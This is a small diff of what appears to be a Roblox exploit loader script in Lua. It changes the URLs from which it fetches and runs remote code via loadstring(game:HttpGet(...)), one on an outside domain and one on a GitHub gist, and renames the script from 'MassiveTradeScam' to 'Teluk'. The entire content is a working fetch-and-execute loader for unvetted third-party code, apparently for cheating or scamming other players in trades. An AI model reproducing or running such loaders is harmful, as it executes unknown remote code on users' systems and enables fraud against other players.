@@ -1,5 +1,5 @@
 getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/c8873d65d902d96625280ffe.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/3d46538c8ff87e5ad632eae1.lua", true))()
 
-_G.scriptName = "MassiveTradeScam"
-loadstring(game:HttpGet("https://gist.githubusercontent.com/YoshikoScript/690fde81c0ae4ded0e36964c4e6e4294/raw/387f646d05e8dded70d7e5e285ac101dff32ed73/hakdoken"))()
+_G.scriptName = "Teluk"
+loadstring(game:HttpGet("https://gist.githubusercontent.com/YoshikoScript/8e00b4b939e05126cd2ce7a26e25d16b/raw/d2607cb8cbde91ab44c44bff33f2e9ca00d7656f/Teluk"))()
